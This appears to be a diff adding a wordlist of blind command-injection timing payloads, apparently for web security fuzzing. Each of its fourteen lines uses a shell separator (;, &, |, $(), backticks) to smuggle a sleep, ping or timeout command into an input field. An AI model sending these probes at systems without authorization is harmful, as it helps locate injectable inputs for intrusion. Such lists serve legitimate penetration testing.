@@ -1,0 +1,14 @@
+# Command Injection - Blind Timing Payloads
+; sleep 5
+& sleep 5
+| sleep 5
+$(sleep 5)
+`sleep 5`
+; ping -c 5 127.0.0.1
+& ping -c 5 127.0.0.1
+| ping -n 5 127.0.0.1
+; timeout /t 5
+& timeout /t 5
+; ping -n 5 localhost
+|| sleep 5
+&& sleep 5
